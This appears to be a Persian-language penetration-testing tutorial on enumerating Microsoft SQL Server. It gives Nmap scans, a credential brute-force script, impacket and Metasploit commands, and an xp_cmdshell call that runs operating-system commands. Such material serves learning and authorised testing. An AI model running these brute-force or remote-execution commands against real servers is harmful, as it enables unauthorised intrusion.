

---

## 🔹 مقدمه

وقتی یک دیتابیس **Microsoft SQL Server** روی شبکه هست، هدف مهاجم یا حتی یک مدافع در فاز **Enumeration** اینه که:

- نسخه‌ی SQL رو شناسایی کنه (مثلاً 2008، 2012، 2016 و …)
    
- Authentication mode (Windows auth / SQL auth) رو بفهمه
    
- دیتابیس‌های موجود، یوزرها و پرمیژن‌ها رو لیست کنه
    
- سرویس‌های لینک شده یا تنظیمات ناامن رو پیدا کنه
    

---

## 🔹 مراحل Enumeration روی MS-SQL

### 1. **شناسایی سرویس**

- با استفاده از **Nmap**:
    

```bash
nmap -p 1433 --script ms-sql-info <target-ip>
```

این اسکریپت اطلاعات ورژن، نام سرور، و بعضی کانفیگ‌ها رو نشون میده.

---

### 2. **بررسی Authentication**

MS-SQL دو نوع auth داره:

- **Windows Authentication** (یوزرهای دامین یا لوکال سیستم)
    
- **SQL Authentication** (یوزر/پسورد داخل SQL Server مثل `sa`)
    

با اسکریپت Nmap برای بررسی یوزر/پسورد پیش‌فرض:

```bash
nmap -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=pass.txt <target-ip>
```

---

### 3. **استخراج دیتابیس‌ها و یوزرها**

اگه اعتبارنامه داشته باشی (یا یوزر ناشناس لاگین کنه 😅):

- میشه از ابزار **sqlcmd** یا **Metasploit** استفاده کرد.  
    مثال با `sqsh` یا `impacket-mssqlclient.py`:
    

```bash
impacket-mssqlclient username:password@<target-ip>
```

بعدش دستورهای پایه‌ای SQL:

```sql
SELECT name FROM sys.databases;   -- لیست دیتابیس‌ها
SELECT name FROM syslogins;       -- لیست یوزرها
SELECT * FROM sysobjects;         -- لیست آبجکت‌ها (table, proc)
```

---

### 4. **بررسی xp_cmdshell**

خیلی مهمه 😎  
MS-SQL قابلیتی داره به اسم `xp_cmdshell` که اگه فعال باشه، میشه دستورات سیستم‌عامل رو اجرا کرد.

```sql
EXEC xp_cmdshell 'whoami';
```

اگه جواب بده → عملاً RCE داری.

---

### 5. **Enumeration با Metasploit**

Metasploit چند ماژول خوب داره:

```bash
use auxiliary/admin/mssql/mssql_enum      # لیست سرورها
use auxiliary/scanner/mssql/mssql_ping   # پیدا کردن SQL Server
use auxiliary/admin/mssql/mssql_enum_domain_accounts
use auxiliary/admin/mssql/mssql_exec     # اجرای دستور از راه دور
```

---

### 6. **دسترسی غیرمستقیم**

- بررسی **Linked Servers** (ممکنه به سرورهای دیگه وصل باشه).
    
- بررسی **Trusts** بین دیتابیس‌ها.
    
- جستجو برای ذخیره‌ی پسورد یا اطلاعات حساس داخل جدول‌ها.
    

---

## 🔹 جمع‌بندی

MS-SQL Enumeration یعنی:

1. پیدا کردن سرویس (Nmap, metasploit, impacket)
    
2. تست احراز هویت (SQL auth / Windows auth)
    
3. لیست کردن دیتابیس‌ها و یوزرها
    
4. بررسی تنظیمات ناامن مثل `xp_cmdshell` یا Linked Servers
    
5. در نهایت استفاده از ابزارهای اختصاصی مثل **impacket-mssqlclient**, **Metasploit**, یا حتی `sqlcmd`.
    

---
